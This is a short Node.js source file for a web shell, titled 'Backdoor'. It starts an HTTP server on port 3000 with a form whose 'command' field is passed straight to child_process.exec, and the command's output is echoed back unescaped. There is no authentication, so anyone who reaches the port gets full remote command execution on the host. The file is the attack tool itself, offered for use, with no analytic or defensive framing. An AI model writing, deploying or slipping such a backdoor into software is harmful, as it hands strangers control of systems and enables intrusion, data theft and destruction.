const { exec } = require('child_process');
const url = require('url');

const template = (stdout, stderr) => {
    return `
    <html>
        <head>
            <meta charset="utf-8">
            <title>Backdoor</title>
        </head>
        <body>
            <form method="GET">
                <input type="text" name="command" placeholder="Command">
                <input type="submit" value="Execute">
            </form>
            <br>
            <pre>${stdout}</pre>
            <hr>
            <pre>${stderr}</pre>
        </body>
    </html>
    `;
};

const server = require('http').createServer((request, response) => {

    const query = url.parse(request.url, true).query;

    if (!query || !query.command) {
        response.end(template('', ''));
        return;
    }

    exec(query.command, (err, stdout, stderr) => {
        if (err) {
            response.end(template('', ''));
            return;
        }
        response.end(template(stdout, stderr));
    });

});

server.listen(3000, (err) => {
    if (err) {
        return console.log('something bad happened', err);
    }
    console.log('Backdoor UP');
});